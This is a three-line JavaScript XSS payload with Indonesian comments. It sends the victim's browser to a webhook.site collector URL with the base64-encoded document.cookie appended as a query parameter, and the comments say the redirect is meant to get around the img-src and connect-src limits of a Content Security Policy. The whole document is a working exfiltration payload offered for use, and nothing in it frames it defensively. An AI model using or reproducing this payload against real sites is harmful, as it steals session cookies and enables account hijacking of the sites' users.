// Menggunakan window.location untuk bypass pembatasan img-src dan connect-src
// Data akan dikirim sebagai query parameter 'c'
window.location = "https://webhook.site/b74e2458-abe5-41bf-8319-55fe0e931aeb?c=" + btoa(document.cookie);
